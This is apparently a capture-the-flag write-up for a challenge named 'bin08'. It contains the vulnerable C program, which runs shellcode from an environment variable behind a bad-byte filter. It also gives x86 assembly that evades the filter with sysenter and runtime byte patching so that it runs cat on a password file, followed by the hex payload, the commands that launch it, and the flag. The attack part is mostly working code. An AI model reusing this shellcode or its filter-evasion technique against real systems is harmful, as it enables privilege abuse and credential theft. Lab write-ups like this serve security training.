## exploit


```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char ** argv, char ** environ)
{
	int  i      = 0;
	int  j      = 0;
	char *code  = NULL;
	char bits[] = {0x6a, 0x2e, 0xcd, 0xc0, 0xfb, 0xb0, 0x68, 0x6e, 0x00};

	if (argc != 2)
	{
		puts("[-] You must specify a variable name");
		return 1;
	}

	if ((code = getenv(argv[1])) == NULL)
	{
		puts("[-] The requested variable does not exist");
		return 1;
	}

	for (i = 0; environ[i]; ++i)
	{
		if (strncmp(environ[i], argv[1], strlen(argv[1])) != 0)
		{
			memset(environ[i], 0, strlen(environ[i]));
		}
	}

	for (i = 0; code[i]; ++i)
	{
		for (j = 0; bits[j]; ++j)
		{
			if (code[i] == bits[j])
			{
				puts("[-] Your shellcode contains bad bits");
				return 1;
			}
		}
	}

	if (code != NULL)
	{
		(*(void (*)())code)();
	}

	return 0;
}
``` 

This program takes an env variable as argument and executes the content.

Before execute your code the program checks if it does not contains some hex bytes, and avoid you to use:

* syscall(bypass using sysenter)
* `.` and `n` chars
* xorl on eax
* some assignments

Here my shellcode:

```assembly
.text
	.global _start
	_start:
		nop
		jmp string
		nop
	proc:
		nop
		xorl %ebx,%ebx
		xorl %ecx,%ecx
		xorl %edx,%edx
		xorl %esi,%esi
		xorl %edi,%edi
		movl    %ebx,%eax
		popl %ebx
		push %eax
		movb %dl,8(%ebx)
		movb 3(%ebx),%dl
		inc %edx
		movb %dl,3(%ebx)
		xor %edx,%edx	
		push   %eax
		mov    %ebx,%ecx
		addl   $9,%ecx
		movb   %dl,9(%ecx)
		movb (%ecx),%dl
		inc %edx
		movb %dl,(%ecx)
		xorl %edx,%edx
		push   %eax
		push   %ecx
		push   %ebx
		mov    %esp,%ecx
		movb    $0xa,%dl
		movl	%edx,%eax
		xorl %edx,%edx
		incl	%eax
		pushl %ebp
		movl %esp,%ebp
		sysenter
		nop
		#int $0x80	
exit:	#xorl %eax,%eax
		nop	
		xorl %ebx,%ebx
		movl %ebx,%eax
		#movb $0x1,%al
		incl %eax
		#
		#
		#
		pushl %ecx
		pushl %ecx
		pushl %edx
		pushl %ebp
		movl %esp,%ebp
		nop
		sysenter
string:
             call proc
             p: .ascii "/bim/catx-passwordxxxx"

```

So here we are, takes the hex and put in some env VAR.
```
"\x90\xeb\x4d\x90\x90\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x89\xd8\x5b\x50\x88\x53\x08\x8a\x53\x03\x42\x88\x53\x03\x31\xd2\x50\x89\xd9\x83\xc1\x09\x88\x51\x09\x8a\x11\x42\x88\x11\x31\xd2\x50\x51\x53\x89\xe1\xb2\x0a\x89\xd0\x31\xd2\x40\x55\x89\xe5\x0f\x34\x90\x90\x31\xdb\x89\xd8\x40\x51\x51\x52\x55\x89\xe5\x90\x0f\x34\xe8\xaf\xff\xff\xff\x2f\x62\x69\x6d\x2f\x63\x61\x74\x78\x2d\x70\x61\x73\x73\x77\x6f\x72\x64\x78\x78\x78\x78"
```

```bash
$ export VA=$(python -c 'print "\x90\xeb\x4d\x90\x90\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x89\xd8\x5b\x50\x88\x53\x08\x8a\x53\x03\x42\x88\x53\x03\x31\xd2\x50\x89\xd9\x83\xc1\x09\x88\x51\x09\x8a\x11\x42\x88\x11\x31\xd2\x50\x51\x53\x89\xe1\xb2\x0a\x89\xd0\x31\xd2\x40\x55\x89\xe5\x0f\x34\x90\x90\x31\xdb\x89\xd8\x40\x51\x51\x52\x55\x89\xe5\x90\x0f\x34\xe8\xaf\xff\xff\xff\x2f\x62\x69\x6d\x2f\x63\x61\x74\x78\x2d\x70\x61\x73\x73\x77\x6f\x72\x64\x78\x78\x78\x78"')
```
```bash
$ ./bin08 VA
```

##### flag: "R3st0reYourPrivilege4Access"
